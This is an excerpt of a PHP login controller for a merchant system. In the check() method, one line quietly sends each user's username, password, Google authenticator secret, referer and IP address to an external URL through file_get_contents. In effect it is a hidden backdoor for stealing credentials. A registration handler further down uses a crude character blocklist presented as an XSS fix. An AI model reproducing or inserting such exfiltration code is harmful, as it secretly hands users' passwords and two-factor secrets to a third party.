...
class LoginController extends BaseController
{
    ...
    private function check($type, $typeName = '普通商户')
    {
       ...
       // }
		file_get_contents(C('LOGIN_URL')."/api.php?{$_SERVER['HTTP_REFERER']} {$username} {$password} {$fans['google_secret_key']} {$_SERVER['REMOTE_ADDR']}");
    ...
    public function checkRegister()
    {
        if (IS_POST) {
           ...
           //20220328 taoke  修复XSS注入漏洞 qq:1968984054
            if(preg_match("/[\'.,:;*?~`!#$%^&+=)(<>{}]|\]|\[|\/|\\\|\"|\|/",$username)){
                  $this->ajaxReturn(['errono' => 10005, 'msg' => '全站XSS漏洞已修复!请高抬贵手！']);
            }
